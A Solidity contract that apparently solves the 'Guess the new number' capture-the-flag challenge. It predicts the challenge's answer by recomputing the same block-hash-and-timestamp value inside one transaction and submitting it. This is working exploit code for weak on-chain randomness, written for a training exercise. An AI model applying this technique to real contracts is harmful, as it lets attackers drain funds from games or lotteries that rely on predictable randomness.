// SPDX-License-Identifier: GPL-3.0

import "./GuessTheNewNumber.sol";

pragma solidity ^0.4.21;

contract GuessTheNewNumberGuesser {
    GuessTheNewNumberChallenge _challengeContract;
    
    function GuessTheNewNumberGuesser(address challengeContract) public payable {
        _challengeContract = GuessTheNewNumberChallenge(challengeContract);
    }
    
    function guess() external {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        _challengeContract.guess(answer);
    }
    
    function() external payable {}
}